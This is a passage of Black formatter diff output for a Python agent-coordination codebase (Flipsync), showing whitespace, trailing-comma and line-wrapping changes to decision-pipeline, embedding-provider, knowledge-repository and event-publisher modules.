-    KnowledgeFilter, TopicFilter, TypeFilter, StatusFilter, TagFilter, SourceFilter,
-    CompositeFilter, AndFilter, OrFilter, NotFilter
+    KnowledgeFilter,
+    TopicFilter,
+    TypeFilter,
+    StatusFilter,
+    TagFilter,
+    SourceFilter,
+    CompositeFilter,
+    AndFilter,
+    OrFilter,
+    NotFilter,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.knowledge_subscriber import (
-    KnowledgeSubscriber, SubscriptionFilter, CustomFilter
+    KnowledgeSubscriber,
+    SubscriptionFilter,
+    CustomFilter,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.knowledge_validator import (
-    KnowledgeValidator, ValidationError, SchemaValidator
+    KnowledgeValidator,
+    ValidationError,
+    SchemaValidator,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.knowledge_retriever import (
-    KnowledgeRetriever, QueryResult, SimilaritySearch, MetadataFilter
+    KnowledgeRetriever,
+    QueryResult,
+    SimilaritySearch,
+    MetadataFilter,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.knowledge_cache import (
-    KnowledgeCache, CacheStrategy, LRUCache
+    KnowledgeCache,
+    CacheStrategy,
+    LRUCache,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.in_memory_knowledge_repository import (
-    InMemoryKnowledgeRepository
+    InMemoryKnowledgeRepository,
 )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/models.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/models.py	2025-06-19 04:03:51.054044+00:00
@@ -18,11 +18,11 @@
 from typing import Any, Dict, List, Optional, Set, Union
 
 
 class DecisionType(str, Enum):
     """Types of decisions that can be made by the system."""
-    
+
     ACTION = "action"  # Decision to take an action
     RECOMMENDATION = "recommendation"  # Decision to recommend something
     OPTIMIZATION = "optimization"  # Decision to optimize something
     ALLOCATION = "allocation"  # Decision to allocate resources
     PRIORITIZATION = "prioritization"  # Decision to prioritize something
@@ -33,11 +33,11 @@
     CUSTOM = "custom"  # Custom decision type
 
 
 class DecisionStatus(str, Enum):
     """Status of a decision in the system."""
-    
+
     PENDING = "pending"  # Decision is pending
     VALIDATING = "validating"  # Decision is being validated
     APPROVED = "approved"  # Decision has been approved
     REJECTED = "rejected"  # Decision has been rejected
     EXECUTING = "executing"  # Decision is being executed
@@ -47,20 +47,20 @@
     EXPIRED = "expired"  # Decision has expired
 
 
 class DecisionConfidence(Enum):
     """Standardized confidence levels for decisions."""
-    
+
     VERY_HIGH = 0.9  # Very high confidence (90%+)
     HIGH = 0.75  # High confidence (75-90%)
     MEDIUM = 0.5  # Medium confidence (50-75%)
     LOW = 0.0  # Low confidence (0-50%)
 
 
 class DecisionMetadata:
     """Metadata for a decision."""
-    
+
     def __init__(
         self,
         decision_id: Optional[str] = None,
         correlation_id: Optional[str] = None,
         causation_id: Optional[str] = None,
@@ -72,14 +72,14 @@
         status: DecisionStatus = DecisionStatus.PENDING,
         retry_count: int = 0,
         max_retries: int = 3,
         conversation_id: Optional[str] = None,
         user_id: Optional[str] = None,
-        custom: Optional[Dict[str, Any]] = None
+        custom: Optional[Dict[str, Any]] = None,
     ):
         """Initialize decision metadata.
-        
+
         Args:
             decision_id: Unique identifier for the decision
             correlation_id: ID for correlating related decisions
             causation_id: ID of the decision that caused this one
             version: Version of the decision model
@@ -106,14 +106,14 @@
         self.retry_count = retry_count
         self.max_retries = max_retries
         self.conversation_id = conversation_id
         self.user_id = user_id
         self.custom = custom or {}
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert metadata to a dictionary.
-        
+
         Returns:
             Dictionary representation of the metadata
         """
         return {
             "decision_id": self.decision_id,
@@ -127,37 +127,37 @@
             "status": self.status.value,
             "retry_count": self.retry_count,
             "max_retries": self.max_retries,
             "conversation_id": self.conversation_id,
             "user_id": self.user_id,
-            "custom": self.custom
+            "custom": self.custom,
         }
-    
+
     @classmethod
     def from_dict(cls, data: Dict[str, Any]) -> "DecisionMetadata":
         """Create metadata from a dictionary.
-        
+
         Args:
             data: Dictionary representation of the metadata
-            
+
         Returns:
             DecisionMetadata instance
         """
         # Convert string timestamps to datetime objects
         created_at = data.get("created_at")
         if created_at and isinstance(created_at, str):
             created_at = datetime.fromisoformat(created_at)
-        
+
         updated_at = data.get("updated_at")
         if updated_at and isinstance(updated_at, str):
             updated_at = datetime.fromisoformat(updated_at)
-        
+
         # Convert string status to enum
         status = data.get("status")
         if status and isinstance(status, str):
             status = DecisionStatus(status)
-        
+
         return cls(
             decision_id=data.get("decision_id"),
             correlation_id=data.get("correlation_id"),
             causation_id=data.get("causation_id"),
             version=data.get("version", "1.0"),
@@ -168,52 +168,52 @@
             status=status or DecisionStatus.PENDING,
             retry_count=data.get("retry_count", 0),
             max_retries=data.get("max_retries", 3),
             conversation_id=data.get("conversation_id"),
             user_id=data.get("user_id"),
-            custom=data.get("custom", {})
+            custom=data.get("custom", {}),
         )
-    
+
     def to_json(self) -> str:
         """Convert metadata to a JSON string.
-        
+
         Returns:
             JSON string representation of the metadata
         """
         return json.dumps(self.to_dict())
-    
+
     @classmethod
     def from_json(cls, json_str: str) -> "DecisionMetadata":
         """Create metadata from a JSON string.
-        
+
         Args:
             json_str: JSON string representation of the metadata
-            
+
         Returns:
             DecisionMetadata instance
         """
         data = json.loads(json_str)
         return cls.from_dict(data)
 
 
 class Decision:
     """Decision model for the Decision Pipeline component."""
-    
+
     def __init__(
         self,
         decision_type: DecisionType,
         action: str,
         confidence: float,
         reasoning: str,
         alternatives: Optional[List[str]] = None,
         metadata: Optional[DecisionMetadata] = None,
         context: Optional[Dict[str, Any]] = None,
         battery_efficient: bool = False,
-        network_efficient: bool = False
+        network_efficient: bool = False,
     ):
         """Initialize a decision.
-        
+
         Args:
             decision_type: Type of decision
             action: Action to take
             confidence: Confidence level (0.0 to 1.0)
             reasoning: Reasoning behind the decision
@@ -230,38 +230,38 @@
         self.alternatives = alternatives or []
         self.metadata = metadata or DecisionMetadata()
         self.context = context or {}
         self.battery_efficient = battery_efficient
         self.network_efficient = network_efficient
-    
+
     @property
     def confidence_level(self) -> DecisionConfidence:
         """Get standardized confidence level.
-        
+
         Returns:
             Standardized confidence level
         """
         if self.confidence >= DecisionConfidence.VERY_HIGH.value:
             return DecisionConfidence.VERY_HIGH
         elif self.confidence >= DecisionConfidence.HIGH.value:
             return DecisionConfidence.HIGH
         elif self.confidence >= DecisionConfidence.MEDIUM.value:
             return DecisionConfidence.MEDIUM
         return DecisionConfidence.LOW
-    
+
     def update_status(self, status: DecisionStatus) -> None:
         """Update the decision status.
-        
+
         Args:
             status: New status
         """
         self.metadata.status = status
         self.metadata.updated_at = datetime.now()
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert decision to a dictionary.
-        
+
         Returns:
             Dictionary representation of the decision
         """
         return {
             "decision_type": self.decision_type.value,
@@ -270,65 +270,65 @@
             "reasoning": self.reasoning,
             "alternatives": self.alternatives,
             "metadata": self.metadata.to_dict(),
             "context": self.context,
             "battery_efficient": self.battery_efficient,
-            "network_efficient": self.network_efficient
+            "network_efficient": self.network_efficient,
         }
-    
+
     @classmethod
     def from_dict(cls, data: Dict[str, Any]) -> "Decision":
         """Create a decision from a dictionary.
-        
+
         Args:
             data: Dictionary representation of the decision
-            
+
         Returns:
             Decision instance
         """
         # Convert string decision type to enum
         decision_type = data.get("decision_type")
         if decision_type and isinstance(decision_type, str):
             decision_type = DecisionType(decision_type)
-        
+
         # Create metadata from dict
         metadata_dict = data.get("metadata", {})
         metadata = DecisionMetadata.from_dict(metadata_dict)
-        
+
         return cls(
             decision_type=decision_type,
             action=data.get("action", ""),
             confidence=data.get("confidence", 0.0),
             reasoning=data.get("reasoning", ""),
             alternatives=data.get("alternatives", []),
             metadata=metadata,
             context=data.get("context", {}),
             battery_efficient=data.get("battery_efficient", False),
-            network_efficient=data.get("network_efficient", False)
+            network_efficient=data.get("network_efficient", False),
         )
-    
+
     def to_json(self) -> str:
         """Convert decision to a JSON string.
-        
+
         Returns:
             JSON string representation of the decision
         """
         return json.dumps(self.to_dict())
-    
+
     @classmethod
     def from_json(cls, json_str: str) -> "Decision":
         """Create a decision from a JSON string.
-        
+
         Args:
             json_str: JSON string representation of the decision
-            
+
         Returns:
             Decision instance
         """
         data = json.loads(json_str)
         return cls.from_dict(data)
-    
+
     @classmethod
     def create(
         cls,
         decision_type: DecisionType,
         action: str,
@@ -337,14 +337,14 @@
         alternatives: Optional[List[str]] = None,
         source: Optional[str] = None,
         target: Optional[str] = None,
         context: Optional[Dict[str, Any]] = None,
         battery_efficient: bool = False,
-        network_efficient: bool = False
+        network_efficient: bool = False,
     ) -> "Decision":
         """Create a decision with metadata.
-        
+
         Args:
             decision_type: Type of decision
             action: Action to take
             confidence: Confidence level (0.0 to 1.0)
             reasoning: Reasoning behind the decision
@@ -352,55 +352,52 @@
             source: Source of the decision (e.g., agent ID)
             target: Target of the decision (e.g., agent ID)
             context: Context in which the decision was made
             battery_efficient: Whether the decision is battery-efficient
             network_efficient: Whether the decision is network-efficient
-            
+
         Returns:
             Decision instance with metadata
         """
-        metadata = DecisionMetadata(
-            source=source,
-            target=target
-        )
-        
+        metadata = DecisionMetadata(source=source, target=target)
+
         return cls(
             decision_type=decision_type,
             action=action,
             confidence=confidence,
             reasoning=reasoning,
             alternatives=alternatives,
             metadata=metadata,
             context=context,
             battery_efficient=battery_efficient,
-            network_efficient=network_efficient
+            network_efficient=network_efficient,
         )
 
 
 class DecisionError(Exception):
     """Error raised by the Decision Pipeline component."""
-    
+
     def __init__(
         self,
         message: str,
         error_code: Optional[str] = None,
-        details: Optional[Dict[str, Any]] = None
+        details: Optional[Dict[str, Any]] = None,
     ):
         """Initialize a decision error.
-        
+
         Args:
             message: Error message
             error_code: Error code
             details: Additional error details
         """
         super().__init__(message)
         self.message = message
         self.error_code = error_code or "DECISION_ERROR"
         self.details = details or {}
-    
+
     def __str__(self) -> str:
         """Get string representation of the error.
-        
+
         Returns:
             String representation
         """
         return f"{self.error_code}: {self.message}"
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/models.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/pipeline.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/pipeline.py	2025-06-19 04:03:50.767162+00:00
@@ -20,18 +20,27 @@
 import logging
 from datetime import datetime
 from typing import Any, Dict, List, Optional, Set, Tuple, Union
 
 from fs_agt_clean.core.coordination.decision.interfaces import (
-    DecisionMaker, DecisionValidator, DecisionTracker,
-    FeedbackProcessor, LearningEngine, DecisionPipeline
+    DecisionMaker,
+    DecisionValidator,
+    DecisionTracker,
+    FeedbackProcessor,
+    LearningEngine,
+    DecisionPipeline,
 )
 from fs_agt_clean.core.coordination.decision.models import (
-    Decision, DecisionType, DecisionStatus, DecisionConfidence, DecisionError
+    Decision,
+    DecisionType,
+    DecisionStatus,
+    DecisionConfidence,
+    DecisionError,
 )
 from fs_agt_clean.core.coordination.event_system import (
-    EventPublisher, NotificationEvent
+    EventPublisher,
+    NotificationEvent,
 )
 
 
 logger = logging.getLogger(__name__)
 
@@ -45,11 +54,11 @@
         decision_maker: DecisionMaker,
         decision_validator: DecisionValidator,
         decision_tracker: DecisionTracker,
         feedback_processor: FeedbackProcessor,
         learning_engine: LearningEngine,
-        publisher: EventPublisher
+        publisher: EventPublisher,
     ):
         """Initialize the decision pipeline.
 
         Args:
             pipeline_id: Unique identifier for this pipeline
@@ -85,11 +94,11 @@
 
     async def make_decision(
         self,
         context: Dict[str, Any],
         options: List[Dict[str, Any]],
-        constraints: Optional[Dict[str, Any]] = None
+        constraints: Optional[Dict[str, Any]] = None,
     ) -> Decision:
         """Make a decision based on context, options, and constraints.
 
         Args:
             context: Context in which the decision is being made
@@ -108,30 +117,25 @@
             # Apply confidence adjustment based on learning
             adjusted_context = await self._apply_learning(context)
 
             # Make the decision
             decision = await self.decision_maker.make_decision(
-                adjusted_context,
-                options,
-                constraints
+                adjusted_context, options, constraints
             )
 
             # Track the decision
             await self.decision_tracker.track_decision(decision)
 
             return decision
         except Exception as e:
             logger.error(f"Error making decision: {e}")
             raise DecisionError(
                 message=f"Failed to make decision: {e}",
-                error_code="DECISION_MAKING_ERROR"
-            )
-
-    async def validate_decision(
-        self,
-        decision: Decision
-    ) -> Tuple[bool, List[str]]:
+                error_code="DECISION_MAKING_ERROR",
+            )
+
+    async def validate_decision(self, decision: Decision) -> Tuple[bool, List[str]]:
         """Validate a decision against rules and constraints.
 
         Args:
             decision: The decision to validate
 
@@ -143,39 +147,36 @@
         """
         logger.debug(f"Validating decision {decision.metadata.decision_id}")
 
         try:
             # Validate the decision
-            is_valid, messages = await self.decision_validator.validate_decision(decision)
+            is_valid, messages = await self.decision_validator.validate_decision(
+                decision
+            )
 
             # Update decision status based on validation
             if is_valid:
                 decision.update_status(DecisionStatus.APPROVED)
                 await self.decision_tracker.update_decision_status(
-                    decision.metadata.decision_id,
-                    DecisionStatus.APPROVED
+                    decision.metadata.decision_id, DecisionStatus.APPROVED
                 )
             else:
                 decision.update_status(DecisionStatus.REJECTED)
                 await self.decision_tracker.update_decision_status(
-                    decision.metadata.decision_id,
-                    DecisionStatus.REJECTED
+                    decision.metadata.decision_id, DecisionStatus.REJECTED
                 )
 
             return is_valid, messages
         except Exception as e:
             logger.error(f"Error validating decision: {e}")
             raise DecisionError(
                 message=f"Failed to validate decision: {e}",
-                error_code="DECISION_VALIDATION_ERROR"
+                error_code="DECISION_VALIDATION_ERROR",
             )
 
     async def execute_decision(
-        self,
-        decision: Decision,
-        validate: bool = False,
-        offline: bool = False
+        self, decision: Decision, validate: bool = False, offline: bool = False
     ) -> bool:
         """Execute a decision.
 
         Args:
             decision: The decision to execute
@@ -195,49 +196,49 @@
             if validate:
                 is_valid, messages = await self.validate_decision(decision)
                 if not is_valid:
                     raise DecisionError(
                         message=f"Decision validation failed: {messages}",
-                        error_code="DECISION_VALIDATION_FAILED"
+                        error_code="DECISION_VALIDATION_FAILED",
                     )
 
             # Always track the decision first
             await self.decision_tracker.track_decision(
-                decision,
-                publish_event=not offline,
-                offline=offline
+                decision, publish_event=not offline, offline=offline
             )
 
             # Update decision status
             decision.update_status(DecisionStatus.EXECUTING)
             await self.decision_tracker.update_decision_status(
                 decision.metadata.decision_id,
                 DecisionStatus.EXECUTING,
-                publish_event=not offline
+                publish_event=not offline,
             )
 
             # Simulate execution (in a real implementation, this would perform the action)
             # For now, we just update the status to COMPLETED
             decision.update_status(DecisionStatus.COMPLETED)
             await self.decision_tracker.update_decision_status(
                 decision.metadata.decision_id,
                 DecisionStatus.COMPLETED,
-                publish_event=not offline
+                publish_event=not offline,
             )
 
             # Publish execution event if not offline
             if not offline:
                 try:
                     await self.publisher.publish_notification(
                         notification_name="decision_executed",
                         data={
                             "decision_id": decision.metadata.decision_id,
                             "action": decision.action,
-                            "timestamp": datetime.now().isoformat()
-                        }
+                            "timestamp": datetime.now().isoformat(),
+                        },
                     )
-                    logger.debug(f"Published decision_executed event for {decision.metadata.decision_id}")
+                    logger.debug(
+                        f"Published decision_executed event for {decision.metadata.decision_id}"
+                    )
                 except Exception as e:
                     logger.error(f"Error publishing decision_executed event: {e}")
 
             return True
         except DecisionError:
@@ -245,19 +246,19 @@
             raise
         except Exception as e:
             logger.error(f"Error executing decision: {e}")
             raise DecisionError(
                 message=f"Failed to execute decision: {e}",
-                error_code="DECISION_EXECUTION_ERROR"
+                error_code="DECISION_EXECUTION_ERROR",
             )
 
     async def process_feedback(
         self,
         decision_id: str,
         feedback_data: Dict[str, Any],
         offline: bool = False,
-        battery_efficient: bool = False
+        battery_efficient: bool = False,
     ) -> bool:
         """Process feedback on a decision and learn from it.
 
         Args:
             decision_id: ID of the decision
@@ -277,29 +278,26 @@
             # Get the decision
             decision = await self.get_decision(decision_id)
             if not decision:
                 raise DecisionError(
                     message=f"Decision {decision_id} not found",
-                    error_code="DECISION_NOT_FOUND"
+                    error_code="DECISION_NOT_FOUND",
                 )
 
             # Process feedback
             result, feedback_id = await self.feedback_processor.process_feedback(
-                decision_id,
-                feedback_data,
-                publish_event=not offline,
-                offline=offline
+                decision_id, feedback_data, publish_event=not offline, offline=offline
             )
 
             # Prepare learning data
             learning_data = {
                 "decision_id": decision_id,
                 "decision_type": decision.decision_type.value,
                 "confidence": decision.confidence,
                 "actual_outcome": feedback_data.get("outcome", "unknown"),
                 "quality": feedback_data.get("quality", 0.5),
-                "relevance": feedback_data.get("relevance", 0.5)
+                "relevance": feedback_data.get("relevance", 0.5),
             }
 
             # Add device info if available
             if "battery_level" in feedback_data:
                 learning_data["battery_level"] = feedback_data["battery_level"]
@@ -309,22 +307,22 @@
 
             # Learn from feedback
             await self.learning_engine.learn_from_feedback(
                 learning_data,
                 publish_event=not offline,
-                battery_efficient=battery_efficient
+                battery_efficient=battery_efficient,
             )
 
             return True
         except DecisionError:
             # Re-raise decision errors
             raise
         except Exception as e:
             logger.error(f"Error processing feedback: {e}")
             raise DecisionError(
                 message=f"Failed to process feedback: {e}",
-                error_code="FEEDBACK_PROCESSING_ERROR"
+                error_code="FEEDBACK_PROCESSING_ERROR",
             )
 
     async def get_decision(self, decision_id: str) -> Optional[Decision]:
         """Get a decision by ID.
 
@@ -343,17 +341,17 @@
             return await self.decision_tracker.get_decision(decision_id)
         except Exception as e:
             logger.error(f"Error getting decision: {e}")
             raise DecisionError(
                 message=f"Failed to get decision: {e}",
-                error_code="DECISION_RETRIEVAL_ERROR"
+                error_code="DECISION_RETRIEVAL_ERROR",
             )
 
     async def get_decision_history(
         self,
         decision_id: Optional[str] = None,
-        filters: Optional[Dict[str, Any]] = None
+        filters: Optional[Dict[str, Any]] = None,
     ) -> List[Decision]:
         """Get the history of decisions.
 
         Args:
             decision_id: Optional ID of a specific decision
@@ -367,18 +365,17 @@
         """
         logger.debug("Getting decision history")
 
         try:
             return await self.decision_tracker.get_decision_history(
-                decision_id=decision_id,
-                filters=filters
+                decision_id=decision_id, filters=filters
             )
         except Exception as e:
             logger.error(f"Error getting decision history: {e}")
             raise DecisionError(
                 message=f"Failed to get decision history: {e}",
-                error_code="DECISION_HISTORY_ERROR"
+                error_code="DECISION_HISTORY_ERROR",
             )
 
     async def _apply_learning(self, context: Dict[str, Any]) -> Dict[str, Any]:
         """Apply learning to the context.
 
@@ -394,10 +391,14 @@
         # Add learning-based adjustments
         adjusted_context["learning_adjustments"] = {}
 
         # Add confidence adjustments for each decision type
         for decision_type in DecisionType:
-            adjustment = await self.learning_engine.get_confidence_adjustment(decision_type)
+            adjustment = await self.learning_engine.get_confidence_adjustment(
+                decision_type
+            )
             if adjustment != 0:
-                adjusted_context["learning_adjustments"][decision_type.value] = adjustment
+                adjusted_context["learning_adjustments"][
+                    decision_type.value
+                ] = adjustment
 
         return adjusted_context
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/pipeline.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/embedding_provider.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/embedding_provider.py	2025-06-19 04:03:50.790073+00:00
@@ -16,252 +16,252 @@
 from fs_agt_clean.core.monitoring import get_logger
 
 
 class EmbeddingError(Exception):
     """Base exception for embedding provider errors."""
-    
+
     def __init__(
         self,
         message: str,
         content: Optional[Any] = None,
-        cause: Optional[Exception] = None
+        cause: Optional[Exception] = None,
     ):
         """
         Initialize an embedding error.
-        
+
         Args:
             message: Error message
             content: Content related to the error
             cause: Original exception that caused this error
         """
         self.message = message
         self.content = content
         self.cause = cause
-        
+
         # Create a detailed error message
         detailed_message = message
         if content is not None:
             content_str = str(content)
             if len(content_str) > 100:
                 content_str = content_str[:97] + "..."
             detailed_message += f" (content: {content_str})"
         if cause:
             detailed_message += f" - caused by: {str(cause)}"
-        
+
         super().__init__(detailed_message)
 
 
 class EmbeddingProvider(abc.ABC):
     """
     Interface for embedding providers.
-    
+
     Embedding providers generate vector embeddings from content,
     enabling similarity search and other vector-based operations.
     """
-    
+
     @abc.abstractmethod
     async def get_embedding(self, content: Any) -> np.ndarray:
         """
         Get an embedding for content.
-        
+
         Args:
             content: Content to embed
-            
+
         Returns:
             Vector embedding of the content
-            
+
         Raises:
             EmbeddingError: If the embedding cannot be generated
         """
         pass
-    
+
     @abc.abstractmethod
     async def get_embeddings(self, contents: List[Any]) -> List[np.ndarray]:
         """
         Get embeddings for multiple content items.
-        
+
         Args:
             contents: Content items to embed
-            
+
         Returns:
             List of vector embeddings
-            
+
         Raises:
             EmbeddingError: If the embeddings cannot be generated
         """
         pass
-    
+
     @abc.abstractmethod
     async def get_embedding_dimension(self) -> int:
         """
         Get the dimension of the embeddings.
-        
+
         Returns:
             Dimension of the embeddings
         """
         pass
 
 
 class SimpleEmbeddingProvider(EmbeddingProvider):
     """
     Simple embedding provider using basic text processing.
-    
+
     This implementation generates embeddings using a simple hash-based
     approach for demonstration purposes. In a real implementation, this
     would be replaced with a more sophisticated embedding model.
     """
-    
+
     def __init__(self, provider_id: str, dimension: int = 128):
         """
         Initialize a simple embedding provider.
-        
+
         Args:
             provider_id: Unique identifier for this provider
             dimension: Dimension of the embeddings
         """
         self.provider_id = provider_id
         self.dimension = dimension
         self.logger = get_logger(f"embedding_provider.{provider_id}")
-    
+
     async def get_embedding(self, content: Any) -> np.ndarray:
         """
         Get an embedding for content.
-        
+
         Args:
             content: Content to embed
-            
+
         Returns:
             Vector embedding of the content
-            
+
         Raises:
             EmbeddingError: If the embedding cannot be generated
         """
         try:
             # Convert content to string
             content_str = self._content_to_string(content)
-            
+
             # Generate a deterministic embedding
             embedding = self._generate_embedding(content_str)
-            
+
             return embedding
         except Exception as e:
             error_msg = f"Failed to generate embedding: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise EmbeddingError(error_msg, content=content, cause=e)
-    
+
     async def get_embeddings(self, contents: List[Any]) -> List[np.ndarray]:
         """
         Get embeddings for multiple content items.
-        
+
         Args:
             contents: Content items to embed
-            
+
         Returns:
             List of vector embeddings
-            
+
         Raises:
             EmbeddingError: If the embeddings cannot be generated
         """
         try:
             # Generate embeddings for each content item
             embeddings = []
             for content in contents:
                 embedding = await self.get_embedding(content)
                 embeddings.append(embedding)
-            
+
             return embeddings
         except EmbeddingError:
             # Re-raise embedding errors
             raise
         except Exception as e:
             error_msg = f"Failed to generate embeddings: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise EmbeddingError(error_msg, content=contents, cause=e)
-    
+
     async def get_embedding_dimension(self) -> int:
         """
         Get the dimension of the embeddings.
-        
+
         Returns:
             Dimension of the embeddings
         """
         return self.dimension
-    
+
     def _content_to_string(self, content: Any) -> str:
         """
         Convert content to a string representation.
-        
+
         Args:
             content: Content to convert
-            
+
         Returns:
             String representation of the content
         """
         if content is None:
             return ""
-        
+
         if isinstance(content, str):
             return content
-        
+
         if isinstance(content, (int, float, bool)):
             return str(content)
-        
+
         if isinstance(content, (list, tuple)):
             return " ".join(self._content_to_string(item) for item in content)
-        
+
         if isinstance(content, dict):
             return " ".join(
                 f"{self._content_to_string(key)} {self._content_to_string(value)}"
                 for key, value in content.items()
             )
-        
+
         # For other types, use the string representation
         return str(content)
-    
+
     def _generate_embedding(self, content_str: str) -> np.ndarray:
         """
         Generate an embedding for a string.
-        
+
         This is a simple hash-based approach for demonstration purposes.
         In a real implementation, this would be replaced with a more
         sophisticated embedding model.
-        
+
         Args:
             content_str: String to embed
-            
+
         Returns:
             Vector embedding of the string
         """
         # Normalize the string
         content_str = content_str.lower()
-        content_str = re.sub(r'[^\w\s]', '', content_str)
-        content_str = re.sub(r'\s+', ' ', content_str).strip()
-        
+        content_str = re.sub(r"[^\w\s]", "", content_str)
+        content_str = re.sub(r"\s+", " ", content_str).strip()
+
         # Generate a hash of the string
         hash_obj = hashlib.sha256(content_str.encode())
         hash_bytes = hash_obj.digest()
-        
+
         # Convert the hash to a vector
         embedding = np.zeros(self.dimension, dtype=np.float32)
         for i in range(min(len(hash_bytes), self.dimension)):
             embedding[i] = float(hash_bytes[i]) / 255.0
-        
+
         # Add some simple features based on the content
         words = content_str.split()
         if words:
             # Word count
             embedding[0] = min(1.0, len(words) / 100.0)
-            
+
             # Average word length
             avg_word_len = sum(len(word) for word in words) / len(words)
             embedding[1] = min(1.0, avg_word_len / 10.0)
-            
+
             # Unique word ratio
             unique_words = set(words)
             embedding[2] = len(unique_words) / len(words)
-        
+
         # Normalize the embedding
         norm = np.linalg.norm(embedding)
         if norm > 0:
             embedding = embedding / norm
-        
+
         return embedding
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/embedding_provider.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/in_memory_knowledge_repository_updates.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/in_memory_knowledge_repository_updates.py	2025-06-19 04:03:50.826738+00:00
@@ -1,130 +1,135 @@
 """
 Implementation of the new methods for the InMemoryKnowledgeRepository class.
 """
 
+
 async def get_all_knowledge(self) -> List[KnowledgeItem]:
     """
     Get all knowledge items in the repository.
-    
+
     Returns:
         List of all knowledge items
-        
+
     Raises:
         KnowledgeError: If the knowledge items cannot be retrieved
     """
     try:
         # Try to get from cache first
         cached_items = await self.cache.get_all()
         if cached_items and len(cached_items) == len(self.knowledge_items):
             return cached_items
-        
+
         # Get all knowledge items
         items = list(self.knowledge_items.values())
-        
+
         # Add to cache
         for item in items:
             await self.cache.add(item)
-        
+
         return items
     except Exception as e:
         error_msg = f"Failed to get all knowledge items: {str(e)}"
         self.logger.error(error_msg, exc_info=True)
         raise KnowledgeError(error_msg, cause=e)
 
+
 async def get_knowledge_updates(self, since_timestamp: datetime) -> List[KnowledgeItem]:
     """
     Get knowledge items updated since a timestamp.
-    
+
     Args:
         since_timestamp: Timestamp to get updates since
-        
+
     Returns:
         List of knowledge items updated since the timestamp
-        
+
     Raises:
         KnowledgeError: If the knowledge items cannot be retrieved
     """
     try:
         # Get all knowledge items
         items = list(self.knowledge_items.values())
-        
+
         # Filter by update timestamp
         updated_items = [item for item in items if item.updated_at > since_timestamp]
-        
+
         # Add to cache
         for item in updated_items:
             await self.cache.add(item)
-        
+
         return updated_items
     except Exception as e:
         error_msg = f"Failed to get knowledge updates since {since_timestamp}: {str(e)}"
         self.logger.error(error_msg, exc_info=True)
         raise KnowledgeError(error_msg, cause=e)
 
-async def get_critical_updates(self, since_timestamp: datetime, priority_threshold: float = 0.5) -> List[KnowledgeItem]:
+
+async def get_critical_updates(
+    self, since_timestamp: datetime, priority_threshold: float = 0.5
+) -> List[KnowledgeItem]:
     """
     Get critical knowledge updates since a timestamp.
-    
+
     This method is optimized for mobile devices with limited bandwidth.
     It returns only high-priority knowledge updates.
-    
+
     Args:
         since_timestamp: Timestamp to get updates since
         priority_threshold: Priority threshold (0.0 to 1.0)
-        
+
     Returns:
         List of critical knowledge items updated since the timestamp
-        
+
     Raises:
         KnowledgeError: If the knowledge items cannot be retrieved
     """
     try:
         # Get all knowledge items updated since the timestamp
         updated_items = await self.get_knowledge_updates(since_timestamp)
-        
+
         # Filter by priority
         critical_items = []
         for item in updated_items:
             # Calculate priority based on metadata, type, and status
             priority = 0.0
-            
+
             # Knowledge type priority
             if item.knowledge_type == KnowledgeType.RULE:
                 priority += 0.3  # Rules are important
             elif item.knowledge_type == KnowledgeType.PROCEDURE:
                 priority += 0.2  # Procedures are somewhat important
-            
+
             # Status priority
             if item.status == KnowledgeStatus.ACTIVE:
                 priority += 0.2  # Active items are important
             elif item.status == KnowledgeStatus.DEPRECATED:
                 priority += 0.1  # Deprecated items are somewhat important
-            
+
             # Metadata priority
             if item.metadata:
                 # Check for priority in metadata
-                if 'priority' in item.metadata:
+                if "priority" in item.metadata:
                     try:
-                        metadata_priority = float(item.metadata['priority'])
+                        metadata_priority = float(item.metadata["priority"])
                         priority += metadata_priority
                     except (ValueError, TypeError):
                         pass
-                
+
                 # Check for critical flag in metadata
-                if 'critical' in item.metadata and item.metadata['critical']:
+                if "critical" in item.metadata and item.metadata["critical"]:
                     priority += 0.3
-            
+
             # Normalize priority to 0.0-1.0 range
             priority = min(1.0, priority)
-            
+
             # Add to critical items if priority is above threshold
             if priority >= priority_threshold:
                 critical_items.append(item)
                 # Add to cache
                 await self.cache.add(item)
-        
+
         return critical_items
     except Exception as e:
         error_msg = f"Failed to get critical knowledge updates since {since_timestamp}: {str(e)}"
         self.logger.error(error_msg, exc_info=True)
         raise KnowledgeError(error_msg, cause=e)
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/in_memory_knowledge_repository_updates.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/event_system/publisher.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/event_system/publisher.py	2025-06-19 04:03:50.823812+00:00
@@ -19,207 +19,213 @@
 from datetime import datetime, timedelta
 from typing import Any, Dict, List, Optional, Set, Type, Union
 
 from fs_agt_clean.core.monitoring import get_logger
 from fs_agt_clean.core.coordination.event_system.event import (
-    Event, EventStatus, EventPriority, CommandEvent, NotificationEvent,
-    QueryEvent, ResponseEvent, ErrorEvent
+    Event,
+    EventStatus,
+    EventPriority,
+    CommandEvent,
+    NotificationEvent,
+    QueryEvent,
+    ResponseEvent,
+    ErrorEvent,
